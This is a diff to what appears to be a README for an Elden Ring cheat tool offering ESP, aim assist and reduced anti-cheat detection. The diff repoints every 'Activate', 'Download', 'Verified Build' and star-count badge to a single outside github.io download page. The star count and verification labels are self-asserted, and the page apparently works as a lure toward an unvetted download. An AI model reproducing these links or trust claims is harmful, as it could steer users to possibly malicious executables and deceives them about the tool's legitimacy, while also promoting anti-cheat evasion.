@@ -24,10 +24,10 @@ Instead of external configs, the Cheat Menu runs as an **in-game overlay UI**. W
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 15.6k Stars](https://img.shields.io/badge/GitHub-15.6k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
+[![⭐️ 15.6k Stars](https://img.shields.io/badge/GitHub-15.6k_Stars-green?logo=github\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
 
 ---
 
@@ -161,8 +161,8 @@ A: It minimizes detection but isn’t 100% undetectable.
 
 The **Elden Ring Cheat Menu** unifies **ESP, aim assist, loot tracking, and farming tools** into one streamlined interface. Whether you’re preparing for punishing bosses, farming runes, or exploring hidden dungeons, it puts full control in your hands.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
 
 ---
